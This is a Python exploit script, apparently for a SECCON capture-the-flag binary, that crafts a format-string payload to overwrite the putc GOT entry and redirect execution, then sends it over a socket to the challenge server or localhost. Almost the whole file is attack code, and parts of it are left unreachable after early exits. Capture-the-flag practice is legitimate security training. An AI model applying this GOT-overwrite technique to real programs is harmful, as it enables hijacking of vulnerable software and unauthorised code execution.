import sys
import socket
import time
import telnetlib
from haclib import *


UNTIL_BUF = 6
JUMP_TO = 0x08048691
JUMP_TO_0 = 0x91
JUMP_TO_1 = 0x86
JUMP_TO_2 = 0x04
JUMP_TO_3 = 0x08
PRINTF_GOT = 0x80499f0
PUTC_GOT = 0x80499f4

### make format string attack string
def make_fsas(target_addr, val_to_write, argc_start):
    ret = p(target_addr)
    ret += p(target_addr + 1)
    ret += p(target_addr + 2)
    ret += p(target_addr + 3)

    val_to_write = p(val_to_write)
    for i in range(len(val_to_write)):
        val = val_to_write[i]
#        print("val = 0x%x" % (val))
        val += 256
        if i == 0:
            val -= 16

        if val > (256 + 8):
            val -= 256
#        print("val = 0x%x" % (val))
        dst = argc_start + i
        s = '%%%dx%%%d$hnn' % (val, dst)
        ret += s.encode()


    return ret

def val2str(val):
    ret = b""
    items = p(val)
    for item in items:
        ret += b"\\x%02x" % (int(item))
    return ret;

def main():
    buf = make_fsas(PUTC_GOT, JUMP_TO, 6)
    sys.stdout.buffer.write(buf)
    sys.exit()
    sys.exit()
    buf = p(PUTC_GOT)
    buf += p(PUTC_GOT + 1)
    buf += p(PUTC_GOT + 2)
    buf += p(PUTC_GOT + 3)
    buf += b'%' + str(JUMP_TO_0 - 16).encode() + b'x%6$hhn'
    buf += b'%245x%7$hhn%126x%8$hhn%4x%9$hhn'
    buf += b'\n'

    sys.stdout.buffer.write(buf)
    sys.exit()

    if(len(sys.argv) > 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("classic.pwn.seccon.jp", 17354))
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("localhost", 28080))

    time.sleep(1)
    read_until(sock, b"What's your name?\n")
    print("What's your name?")
    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)

    read_until(sock, b"flag?\n")
    print("flag?")
    time.sleep(1)

    val = sock.sendall("no\n")
    time.sleep(1)


if __name__ == "__main__":
    main()
